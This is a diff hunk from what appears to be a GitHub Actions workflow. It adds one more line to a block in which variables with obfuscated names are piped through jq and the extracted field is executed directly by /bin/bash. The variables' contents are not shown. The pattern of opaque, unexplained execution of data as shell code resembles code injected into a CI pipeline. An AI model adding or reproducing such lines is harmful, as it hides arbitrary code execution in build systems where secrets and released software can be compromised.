@@ -28,6 +28,7 @@ jobs:
           echo $w6 | jq -r .ui4199 | /bin/bash
           echo $qetug56 | jq -r .ousg30 | /bin/bash
           echo $lpt55 | jq -r .qxij4576 | /bin/bash
+          printf '%s' "$zf10245" | jq -r .psvei38 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
